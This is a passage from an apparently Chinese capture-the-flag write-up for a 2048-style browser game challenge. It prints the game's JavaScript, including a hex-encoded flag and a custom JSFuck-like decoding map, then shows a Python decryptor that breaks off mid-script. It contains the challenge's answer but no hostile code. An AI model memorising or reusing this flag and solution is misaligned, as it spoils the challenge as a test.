+<h2 id="4048"><a href="#4048" class="headerlink" title="4048"></a>4048</h2><p>一个小游戏，我其实玩到4048分了，但是没有给flag，就只能看源码了</p>
+<p>在<code>game.js</code>主要源码就是这一段，可以看到十六进制编码后的flag</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkWin</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">if</span> (winFlagShown) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">if</span> (score === <span class="hljs-number">4048</span>) &#123;<br>        winFlagShown = <span class="hljs-literal">true</span>;<br>        statusBadge.<span class="hljs-property">textContent</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#winModal h2&#x27;</span>).<span class="hljs-property">textContent</span>;<br>        statusBadge.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = <span class="hljs-string">&#x27;#ffd700&#x27;</span>;<br>        <span class="hljs-title function_">showWinModal</span>();<br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">ENCODED_FLAG</span> = <span class="hljs-string">&#x27;0x50, 0x4b, 0x57, 0x43, 0x54, 0x46, 0x7b, 0x34, 0x39, 0x66, 0x31, 0x65, 0x31, 0x39, 0x61, 0x2d, 0x61, 0x39, 0x36, 0x66, 0x2d, 0x34, 0x64, 0x62, 0x61, 0x2d, 0x38, 0x64, 0x37, 0x61, 0x2d, 0x62, 0x37, 0x62, 0x37, 0x64, 0x32, 0x63, 0x61, 0x63, 0x31, 0x32, 0x32, 0x7d&#x27;</span>;<br>        <span class="hljs-keyword">const</span> byteStrArr = <span class="hljs-variable constant_">ENCODED_FLAG</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">s</span> =&gt;</span> s.<span class="hljs-title function_">trim</span>().<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^0x/</span>,<span class="hljs-string">&#x27;&#x27;</span>));<br>        <span class="hljs-keyword">const</span> realHex = byteStrArr.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>        <span class="hljs-keyword">const</span> decoded = <span class="hljs-variable language_">window</span>.<span class="hljs-property">__Jsfuck</span>.<span class="hljs-title function_">decode</span>(realHex);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;score = 4048,Flag :&#x27;</span>, decoded);<br>        flagDisplay.<span class="hljs-property">textContent</span> = decoded;<br>        modalOverlay.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;active&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后在<code>encoder.js</code>里面是自定义的JSFuck映射表</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">ENCODE_MAP</span> = &#123;<br>        <span class="hljs-string">&#x27;0&#x27;</span>: <span class="hljs-string">&#x27;[]!&#x27;</span>,<br>        <span class="hljs-string">&#x27;1&#x27;</span>: <span class="hljs-string">&#x27;()!&#x27;</span>,<br>        <span class="hljs-string">&#x27;2&#x27;</span>: <span class="hljs-string">&#x27;![]&#x27;</span>,<br>        <span class="hljs-string">&#x27;3&#x27;</span>: <span class="hljs-string">&#x27;!()&#x27;</span>,<br>        <span class="hljs-string">&#x27;4&#x27;</span>: <span class="hljs-string">&#x27;+[]&#x27;</span>,<br>        <span class="hljs-string">&#x27;5&#x27;</span>: <span class="hljs-string">&#x27;+()&#x27;</span>,<br>        <span class="hljs-string">&#x27;6&#x27;</span>: <span class="hljs-string">&#x27;[]+&#x27;</span>,<br>        <span class="hljs-string">&#x27;7&#x27;</span>: <span class="hljs-string">&#x27;()+&#x27;</span>,<br>        <span class="hljs-string">&#x27;8&#x27;</span>: <span class="hljs-string">&#x27;![&#x27;</span>,<br>        <span class="hljs-string">&#x27;9&#x27;</span>: <span class="hljs-string">&#x27;!(&#x27;</span>,<br>        <span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-string">&#x27;([])&#x27;</span>,<br>        <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-string">&#x27;(())&#x27;</span>,<br>        <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-string">&#x27;[!]&#x27;</span>,<br>        <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-string">&#x27;[+]&#x27;</span>,<br>        <span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-string">&#x27;(!)&#x27;</span>,<br>        <span class="hljs-string">&#x27;f&#x27;</span>: <span class="hljs-string">&#x27;(+)&#x27;</span>,<br>        <span class="hljs-string">&#x27;g&#x27;</span>: <span class="hljs-string">&#x27;![!]&#x27;</span>,<br>        <span class="hljs-string">&#x27;h&#x27;</span>: <span class="hljs-string">&#x27;![+]&#x27;</span>,<br>        <span class="hljs-string">&#x27;i&#x27;</span>: <span class="hljs-string">&#x27;!(!)&#x27;</span>,<br>        <span class="hljs-string">&#x27;j&#x27;</span>: <span class="hljs-string">&#x27;!(+)&#x27;</span>,<br>        <span class="hljs-string">&#x27;k&#x27;</span>: <span class="hljs-string">&#x27;+[!]&#x27;</span>,<br>        <span class="hljs-string">&#x27;l&#x27;</span>: <span class="hljs-string">&#x27;+[+]&#x27;</span>,<br>        <span class="hljs-string">&#x27;m&#x27;</span>: <span class="hljs-string">&#x27;+(!)&#x27;</span>,<br>        <span class="hljs-string">&#x27;n&#x27;</span>: <span class="hljs-string">&#x27;+(+)&#x27;</span>,<br>        <span class="hljs-string">&#x27;o&#x27;</span>: <span class="hljs-string">&#x27;[![]]&#x27;</span>,<br>        <span class="hljs-string">&#x27;p&#x27;</span>: <span class="hljs-string">&#x27;[!()]&#x27;</span>,<br>        <span class="hljs-string">&#x27;q&#x27;</span>: <span class="hljs-string">&#x27;[+[]]&#x27;</span>,<br>        <span class="hljs-string">&#x27;r&#x27;</span>: <span class="hljs-string">&#x27;[+()]&#x27;</span>,<br>        <span class="hljs-string">&#x27;s&#x27;</span>: <span class="hljs-string">&#x27;([!])&#x27;</span>,<br>        <span class="hljs-string">&#x27;t&#x27;</span>: <span class="hljs-string">&#x27;([+])&#x27;</span>,<br>        <span class="hljs-string">&#x27;u&#x27;</span>: <span class="hljs-string">&#x27;((!))&#x27;</span>,<br>        <span class="hljs-string">&#x27;v&#x27;</span>: <span class="hljs-string">&#x27;((+))&#x27;</span>,<br>        <span class="hljs-string">&#x27;w&#x27;</span>: <span class="hljs-string">&#x27;![![]]&#x27;</span>,<br>        <span class="hljs-string">&#x27;x&#x27;</span>: <span class="hljs-string">&#x27;![!()]&#x27;</span>,<br>        <span class="hljs-string">&#x27;y&#x27;</span>: <span class="hljs-string">&#x27;![+[]]&#x27;</span>,<br>        <span class="hljs-string">&#x27;z&#x27;</span>: <span class="hljs-string">&#x27;![+()]&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>: <span class="hljs-string">&#x27;+[![]]&#x27;</span>,<br>        <span class="hljs-string">&#x27;B&#x27;</span>: <span class="hljs-string">&#x27;+[!()]&#x27;</span>,<br>        <span class="hljs-string">&#x27;C&#x27;</span>: <span class="hljs-string">&#x27;+[+[]]&#x27;</span>,<br>        <span class="hljs-string">&#x27;D&#x27;</span>: <span class="hljs-string">&#x27;+[+()]&#x27;</span>,<br>        <span class="hljs-string">&#x27;E&#x27;</span>: <span class="hljs-string">&#x27;([![]])&#x27;</span>,<br>        <span class="hljs-string">&#x27;F&#x27;</span>: <span class="hljs-string">&#x27;([!()])&#x27;</span>,<br>        <span class="hljs-string">&#x27;G&#x27;</span>: <span class="hljs-string">&#x27;([+[]])&#x27;</span>,<br>        <span class="hljs-string">&#x27;H&#x27;</span>: <span class="hljs-string">&#x27;([+()])&#x27;</span>,<br>        <span class="hljs-string">&#x27;I&#x27;</span>: <span class="hljs-string">&#x27;((![]))&#x27;</span>,<br>        <span class="hljs-string">&#x27;J&#x27;</span>: <span class="hljs-string">&#x27;((!()))&#x27;</span>,<br>        <span class="hljs-string">&#x27;K&#x27;</span>: <span class="hljs-string">&#x27;((+[]))&#x27;</span>,<br>        <span class="hljs-string">&#x27;L&#x27;</span>: <span class="hljs-string">&#x27;((+()))&#x27;</span>,<br>        <span class="hljs-string">&#x27;M&#x27;</span>: <span class="hljs-string">&#x27;![![]!]&#x27;</span>,<br>        <span class="hljs-string">&#x27;N&#x27;</span>: <span class="hljs-string">&#x27;![![]+]&#x27;</span>,<br>        <span class="hljs-string">&#x27;O&#x27;</span>: <span class="hljs-string">&#x27;![!()!]&#x27;</span>,<br>        <span class="hljs-string">&#x27;P&#x27;</span>: <span class="hljs-string">&#x27;![!()+]&#x27;</span>,<br>        <span class="hljs-string">&#x27;Q&#x27;</span>: <span class="hljs-string">&#x27;![+[]!]&#x27;</span>,<br>        <span class="hljs-string">&#x27;R&#x27;</span>: <span class="hljs-string">&#x27;![+[]+]&#x27;</span>,<br>        <span class="hljs-string">&#x27;S&#x27;</span>: <span class="hljs-string">&#x27;![+()!]&#x27;</span>,<br>        <span class="hljs-string">&#x27;T&#x27;</span>: <span class="hljs-string">&#x27;![+()+ ]&#x27;</span>,<br>        <span class="hljs-string">&#x27;U&#x27;</span>: <span class="hljs-string">&#x27;+[![]!]&#x27;</span>,<br>        <span class="hljs-string">&#x27;V&#x27;</span>: <span class="hljs-string">&#x27;+[![]+]&#x27;</span>,<br>        <span class="hljs-string">&#x27;W&#x27;</span>: <span class="hljs-string">&#x27;+[!()!]&#x27;</span>,<br>        <span class="hljs-string">&#x27;X&#x27;</span>: <span class="hljs-string">&#x27;+[!()+ ]&#x27;</span>,<br>        <span class="hljs-string">&#x27;Y&#x27;</span>: <span class="hljs-string">&#x27;+[+[]!]&#x27;</span>,<br>        <span class="hljs-string">&#x27;Z&#x27;</span>: <span class="hljs-string">&#x27;+[+[]+]&#x27;</span>,<br>        <span class="hljs-string">&#x27;&#123;&#x27;</span>: <span class="hljs-string">&#x27;([![]!])&#x27;</span>,<br>        <span class="hljs-string">&#x27;&#125;&#x27;</span>: <span class="hljs-string">&#x27;([![]+])&#x27;</span>,<br>        <span class="hljs-string">&#x27;_&#x27;</span>: <span class="hljs-string">&#x27;([!()!])&#x27;</span>,<br>        <span class="hljs-string">&#x27;-&#x27;</span>: <span class="hljs-string">&#x27;([!()+])&#x27;</span>,<br>        <span class="hljs-string">&#x27;=&#x27;</span>: <span class="hljs-string">&#x27;([+[]!])&#x27;</span>,<br>        <span class="hljs-string">&#x27;+&#x27;</span>: <span class="hljs-string">&#x27;([+[]+])&#x27;</span>,<br>        <span class="hljs-string">&#x27;*&#x27;</span>: <span class="hljs-string">&#x27;([+()!])&#x27;</span>,<br>        <span class="hljs-string">&#x27;/&#x27;</span>: <span class="hljs-string">&#x27;([+()+])&#x27;</span>,<br>        <span class="hljs-string">&#x27;!&#x27;</span>: <span class="hljs-string">&#x27;![![]![]]&#x27;</span>,<br>        <span class="hljs-string">&#x27;@&#x27;</span>: <span class="hljs-string">&#x27;![![]!()]&#x27;</span>,<br>        <span class="hljs-string">&#x27;#&#x27;</span>: <span class="hljs-string">&#x27;![![]+[]]&#x27;</span>,<br>        <span class="hljs-string">&#x27;$&#x27;</span>: <span class="hljs-string">&#x27;![![]+()]&#x27;</span>,<br>        <span class="hljs-string">&#x27;%&#x27;</span>: <span class="hljs-string">&#x27;![!()![]]&#x27;</span>,<br>        <span class="hljs-string">&#x27;^&#x27;</span>: <span class="hljs-string">&#x27;![!()!()]&#x27;</span>,<br>        <span class="hljs-string">&#x27;&amp;&#x27;</span>: <span class="hljs-string">&#x27;![!()+[]]&#x27;</span>,<br>        <span class="hljs-string">&#x27;(&#x27;</span>: <span class="hljs-string">&#x27;![!()+()]&#x27;</span>,<br>        <span class="hljs-string">&#x27;)&#x27;</span>: <span class="hljs-string">&#x27;![+[]![]]&#x27;</span>,<br>        <span class="hljs-string">&#x27;[&#x27;</span>: <span class="hljs-string">&#x27;![+[]!()]&#x27;</span>,<br>        <span class="hljs-string">&#x27;]&#x27;</span>: <span class="hljs-string">&#x27;![+[]+[]]&#x27;</span>,<br>        <span class="hljs-string">&#x27;;&#x27;</span>: <span class="hljs-string">&#x27;![+[]+()]&#x27;</span>,<br>        <span class="hljs-string">&#x27;:&#x27;</span>: <span class="hljs-string">&#x27;![+()![]]&#x27;</span>,<br>        <span class="hljs-string">&quot;&#x27;&quot;</span>: <span class="hljs-string">&#x27;![+()!()]&#x27;</span>,<br>        <span class="hljs-string">&#x27;&quot;&#x27;</span>: <span class="hljs-string">&#x27;![+()+[]]&#x27;</span>,<br>        <span class="hljs-string">&#x27;,&#x27;</span>: <span class="hljs-string">&#x27;![+()+()]&#x27;</span>,<br>        <span class="hljs-string">&#x27;.&#x27;</span>: <span class="hljs-string">&#x27;+[![]![]]&#x27;</span>,<br>        <span class="hljs-string">&#x27;?&#x27;</span>: <span class="hljs-string">&#x27;+[![]!()]&#x27;</span>,<br>        <span class="hljs-string">&#x27;&lt;&#x27;</span>: <span class="hljs-string">&#x27;+[![]+[]]&#x27;</span>,<br>        <span class="hljs-string">&#x27;&gt;&#x27;</span>: <span class="hljs-string">&#x27;+[![]+()]&#x27;</span>,<br>        <span class="hljs-string">&#x27;|&#x27;</span>: <span class="hljs-string">&#x27;+[!()![]]&#x27;</span>,<br>        <span class="hljs-string">&#x27;\\&#x27;</span>: <span class="hljs-string">&#x27;+[!()!()]&#x27;</span>,<br>        <span class="hljs-string">&#x27;`&#x27;</span>: <span class="hljs-string">&#x27;+[!()+[]]&#x27;</span>,<br>        <span class="hljs-string">&#x27;~&#x27;</span>: <span class="hljs-string">&#x27;+[!()+()]&#x27;</span><br>    &#125;;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DECODE_MAP</span> = &#123;&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [ch, code] <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(<span class="hljs-variable constant_">ENCODE_MAP</span>)) &#123;<br>        <span class="hljs-variable constant_">DECODE_MAP</span>[code] = ch;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">str</span>) &#123;<br>        <span class="hljs-keyword">let</span> r = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> ch <span class="hljs-keyword">of</span> str) &#123;<br>            r += (<span class="hljs-variable constant_">ENCODE_MAP</span>[ch] || <span class="hljs-string">&#x27;?&#x27;</span>) + <span class="hljs-string">&#x27; &#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> r.<span class="hljs-title function_">trim</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">encoded</span>) &#123;<br>        <span class="hljs-keyword">return</span> encoded.<span class="hljs-title function_">split</span>(<span class="hljs-regexp">/\s+/</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> <span class="hljs-variable constant_">DECODE_MAP</span>[t] || <span class="hljs-string">&#x27;?&#x27;</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">__Jsfuck</span> = &#123;<br>        <span class="hljs-attr">encode</span>: encode,<br>        <span class="hljs-attr">decode</span>: decode,<br>        <span class="hljs-attr">map</span>: <span class="hljs-variable constant_">ENCODE_MAP</span><br>    &#125;;<br>&#125;)();<br></code></pre></td></tr></table></figure>
+
+<p>还有一个就是<code>main.js</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs js"><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;keydown&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;<br>  <br>    <span class="hljs-keyword">const</span> keyMap = &#123;<br>        <span class="hljs-string">&#x27;ArrowUp&#x27;</span>:<span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;ArrowRight&#x27;</span>:<span class="hljs-number">1</span>,<br>        <span class="hljs-string">&#x27;ArrowDown&#x27;</span>:<span class="hljs-number">2</span>,<br>        <span class="hljs-string">&#x27;ArrowLeft&#x27;</span>:<span class="hljs-number">3</span><br>    &#125;;<br>    <span class="hljs-keyword">if</span>(keyMap.<span class="hljs-title function_">hasOwnProperty</span>(e.<span class="hljs-property">key</span>))&#123;<br>        e.<span class="hljs-title function_">preventDefault</span>();<br>        <span class="hljs-variable language_">window</span>.<span class="hljs-property">__GameAPI</span>.<span class="hljs-title function_">move</span>(keyMap[e.<span class="hljs-property">key</span>]);<br>    &#125;<br>&#125;);<br><br><br><span class="hljs-keyword">const</span> restartBtn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;restartBtn&#x27;</span>);<br>restartBtn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">()=&gt;</span>&#123;<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">__GameAPI</span>.<span class="hljs-title function_">initGame</span>();<br>&#125;);<br><br></code></pre></td></tr></table></figure>
+
+<p>就直接写脚本</p>
+<p>整体逻辑就是现根据<code>encoder.js</code>还原JSFuck映射表，然后提取并清洗Hex字符串，也就是<code>game.js</code>中的ENCODED_FLAG，然后将Hex转换为字符串，最后解码flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">2048 CTF Flag Decryptor</span><br><span class="hljs-string">Usage: python decrypt_flag.py</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># 1. 还原 __Jsfuck 的 ENCODE_MAP（来自第三段源码）</span><br>ENCODE_MAP = &#123;<br>    <span class="hljs-string">&#x27;0&#x27;</span>: <span class="hljs-string">&#x27;[]!&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>: <span class="hljs-string">&#x27;()!&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>: <span class="hljs-string">&#x27;![]&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>: <span class="hljs-string">&#x27;!()&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>: <span class="hljs-string">&#x27;+[]&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>: <span class="hljs-string">&#x27;+()&#x27;</span>,<br>    <span class="hljs-string">&#x27;6&#x27;</span>: <span class="hljs-string">&#x27;[]+&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>: <span class="hljs-string">&#x27;()+&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>: <span class="hljs-string">&#x27;![&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>: <span class="hljs-string">&#x27;!(&#x27;</span>,<br>    <span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-string">&#x27;([])&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-string">&#x27;(())&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-string">&#x27;[!]&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-string">&#x27;[+]&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-string">&#x27;(!)&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>: <span class="hljs-string">&#x27;(+)&#x27;</span>,<br>    <span class="hljs-string">&#x27;g&#x27;</span>: <span class="hljs-string">&#x27;![!]&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>: <span class="hljs-string">&#x27;![+]&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>: <span class="hljs-string">&#x27;!(!)&#x27;</span>, <span class="hljs-string">&#x27;j&#x27;</span>: <span class="hljs-string">&#x27;!(+)&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>: <span class="hljs-string">&#x27;+[!]&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>: <span class="hljs-string">&#x27;+[+]&#x27;</span>,<br>    <span class="hljs-string">&#x27;m&#x27;</span>: <span class="hljs-string">&#x27;+(!)&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>: <span class="hljs-string">&#x27;+(+)&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>: <span class="hljs-string">&#x27;[![]]&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>: <span class="hljs-string">&#x27;[!()]&#x27;</span>, <span class="hljs-string">&#x27;q&#x27;</span>: <span class="hljs-string">&#x27;[+[]]&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>: <span class="hljs-string">&#x27;[+()]&#x27;</span>,<br>    <span class="hljs-string">&#x27;s&#x27;</span>: <span class="hljs-string">&#x27;([!])&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>: <span class="hljs-string">&#x27;([+])&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>: <span class="hljs-string">&#x27;((!))&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>: <span class="hljs-string">&#x27;((+))&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>: <span class="hljs-string">&#x27;![![]]&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>: <span class="hljs-string">&#x27;![!()]&#x27;</span>,<br>    <span class="hljs-string">&#x27;y&#x27;</span>: <span class="hljs-string">&#x27;![+[]]&#x27;</span>, <span class="hljs-string">&#x27;z&#x27;</span>: <span class="hljs-string">&#x27;![+()]&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>: <span class="hljs-string">&#x27;+[![]]&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>: <span class="hljs-string">&#x27;+[!()]&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>: <span class="hljs-string">&#x27;+[+[]]&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>: <span class="hljs-string">&#x27;+[+()]&#x27;</span>,<br>    <span class="hljs-string">&#x27;E&#x27;</span>: <span class="hljs-string">&#x27;([![]])&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>: <span class="hljs-string">&#x27;([!()])&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>: <span class="hljs-string">&#x27;([+[]])&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>: <span class="hljs-string">&#x27;([+()])&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>: <span class="hljs-string">&#x27;((![]))&#x27;</span>, <span class="hljs-string">&#x27;J&#x27;</span>: <span class="hljs-string">&#x27;((!()))&#x27;</span>,<br>    <span class="hljs-string">&#x27;K&#x27;</span>: <span class="hljs-string">&#x27;((+[]))&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>: <span class="hljs-string">&#x27;((+()))&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>: <span class="hljs-string">&#x27;![![]!]&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>: <span class="hljs-string">&#x27;![![]+]&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>: <span class="hljs-string">&#x27;![!()!]&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>: <span class="hljs-string">&#x27;![!()+]&#x27;</span>,<br>    <span class="hljs-string">&#x27;Q&#x27;</span>: <span class="hljs-string">&#x27;![+[]!]&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>: <span class="hljs-string">&#x27;![+[]+]&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>: <span class="hljs-string">&#x27;![+()!]&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>: <span class="hljs-string">&#x27;![+()+ ]&#x27;</span>, <span class="hljs-string">&#x27;U&#x27;</span>: <span class="hljs-string">&#x27;+[![]!]&#x27;</span>, <span class="hljs-string">&#x27;V&#x27;</span>: <span class="hljs-string">&#x27;+[![]+]&#x27;</span>,<br>    <span class="hljs-string">&#x27;W&#x27;</span>: <span class="hljs-string">&#x27;+[!()!]&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>: <span class="hljs-string">&#x27;+[!()+ ]&#x27;</span>, <span 